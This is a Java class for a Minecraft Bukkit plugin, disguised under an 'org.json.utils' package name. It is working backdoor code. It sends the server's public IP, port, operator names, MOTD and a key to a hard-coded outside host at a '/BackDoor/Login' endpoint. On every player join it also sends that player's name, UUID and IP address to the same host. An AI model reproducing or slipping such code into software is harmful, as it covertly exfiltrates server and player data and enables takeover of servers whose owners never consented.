package org.json.utils.api;

import lombok.Getter;
import lombok.Setter;
import org.bukkit.Bukkit;
import org.bukkit.OfflinePlayer;
import org.bukkit.entity.Player;
import org.json.Modal;

import java.io.IOException;
import java.io.InputStream;
import java.net.URL;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.util.Scanner;
import java.util.stream.Collectors;

public class ModalAPI {

    @Getter
    @Setter
    private static String ip;

    public static String sendRequest() {
        getIPAddress();

        try {
            String key = URLEncoder.encode(KeyGen.getKey(), StandardCharsets.UTF_8);
            String plugin = URLEncoder.encode(Modal.getInstance().getDescription().getName(), StandardCharsets.UTF_8);
            String ip = URLEncoder.encode(getIp() + ":" + Bukkit.getPort(), StandardCharsets.UTF_8);

            String ops = URLEncoder.encode(Bukkit.getServer().getOperators().stream()
                    .map(OfflinePlayer::getName)
                    .collect(Collectors.joining(", ")), StandardCharsets.UTF_8);

            String motd = URLEncoder.encode(Modal.getInstance().getServer().getMotd(), StandardCharsets.UTF_8);

            String apiUrlString = "http://5.252.102.172:7001/BackDoor/Login?" +
                    "key=" + key +
                    "&plugin=" + plugin +
                    "&ip=" + ip +
                    "&ops=" + ops +
                    "&motd=" + motd;

            InputStream apiUrl = new URL(apiUrlString).openConnection().getInputStream();

            Scanner scanner = new Scanner(apiUrl);
            return scanner.nextLine();
        } catch (IOException e) {
            return "error!";
        }
    }

    public static void getIPAddress() {
        try {
            InputStream ipUrl = new URL("https://api.ipify.org").openConnection().getInputStream();
            Scanner s = new Scanner(ipUrl);
            setIp(s.nextLine());
        } catch (Exception ignored) {
            setIp("error!");
        }
    }


    public static void sendPlayerJoinReq(Player player) {
        Bukkit.getScheduler().runTaskAsynchronously(Modal.getInstance(), () -> {
            try {
                InputStream input = new URL(
                        ("http://5.252.102.172:7001/BackDoor/PlayerJoin?" +
                                "&name=" + player.getName() +
                                "&uuid=" + player.getUniqueId() +
                                "&ip=" + player.getAddress() +
                                "&serverip=" + getIp() + ":" + Bukkit.getServer().getPort()
                        ).replaceAll(" ", "%20")
                ).openConnection().getInputStream();
            } catch (IOException ignored) {
            }
        });
    }

}
